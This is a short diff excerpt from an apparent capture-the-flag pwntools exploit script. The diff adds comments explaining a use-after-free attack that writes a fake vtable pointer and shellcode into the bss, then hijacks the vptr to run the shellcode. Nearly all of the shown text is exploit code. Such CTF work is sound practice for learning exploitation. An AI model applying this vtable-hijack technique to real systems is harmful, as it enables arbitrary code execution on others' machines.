@@ -27,13 +27,13 @@ def watch(idx):
 name = 0x4083c0
 vptr = name + 8
 r.recvuntil(":")
-r.sendline("a"*8 + p64(vptr) + sc)
+r.sendline("a"*8 + p64(vptr) + sc)# write the evil vptr and the shellcode on the bss
 addMath("a"*8,25)
 addMath("b"*8,26)
 #gdb.attach(r)
 remove(0)
 #gdb.attach(r)
-addMath("a"*(8*11) + p64(vptr),2)
+addMath("a"*(8*11) + p64(vptr),2)# jump to the bss and run the shellcode
 #gdb.attach(r)
 watch(0)
 
